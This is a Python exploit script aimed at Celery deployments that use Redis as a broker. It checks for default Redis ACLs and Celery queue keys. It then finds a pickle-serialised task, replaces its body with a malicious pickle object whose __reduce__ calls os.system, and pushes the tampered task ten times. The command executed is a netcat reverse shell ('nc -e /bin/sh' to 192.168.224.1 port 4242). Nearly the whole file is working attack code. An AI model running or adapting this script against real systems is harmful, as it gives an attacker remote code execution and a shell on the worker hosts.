import redis
import json
import pickle
import base64

COMMAND = "nc -e /bin/sh 192.168.224.1 4242"

r = redis.Redis(
    host='localhost',
    port='6379',
    db=0
)




def has_default_acl(conn: redis.Redis):
    return 'user default on nopass ~* &* +@all' in r.acl_list()


def has_celery(conn: redis.Redis):
    return bool(conn.exists('_kombu.binding.celery.pidbox') and
                conn.exists('_kombu.binding.celery') and
                conn.exists('_kombu.binding.celeryev'))


def can_write(conn: redis.Redis):
    try:
        conn.lpush('celery', "{}")
    except Exception:
        return False
    return True


def write_task(conn: redis.Redis, task):
    try:
        conn.lpush('celery', json.dumps(task))
    except Exception:
        return False
    return True


def search_pickle_task(queue):
    for task in queue:
        parsed_task = json.loads(task)
        if 'content-type' in parsed_task and 'content-encoding' in parsed_task:
            if parsed_task['content-type'] == 'application/x-python-serialize' and parsed_task['content-encoding'] == 'binary':
                return parsed_task
    return None


class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system, (COMMAND, ))


def tamper_task(task):
    body_to_tamper = pickle.loads(base64.b64decode(task['body']))
    body_to_tamper[1]['obj'] = PickleRce()
    tampered_body = base64.b64encode(pickle.dumps(body_to_tamper)).\
        decode('utf-8')
    task['body'] = tampered_body
    return task


print("[+] Looking for pickle")
if has_default_acl(conn=r):
    print("It has default ACL :)")
else:
    print("The default config has been changed :|")
print("[+]Checking for celery....")
if has_celery(conn=r):
    print("It has celery!")
else:
    raise Exception('The broker does not have Celery')
print("[+]Looking for pickle")
task = None
while task is None: 
    task = search_pickle_task(r.lrange('celery', 0, 100))
if task is not None:
    print("VULNERABLE: celery is using pickle")
    tampered_task = tamper_task(task)
    print("[+]Sending the payload")
    for _ in range(0, 10):
        write_task(r, tampered_task)
else:
    raise Exception("NOT VULNERABLE: Sorry we tried")

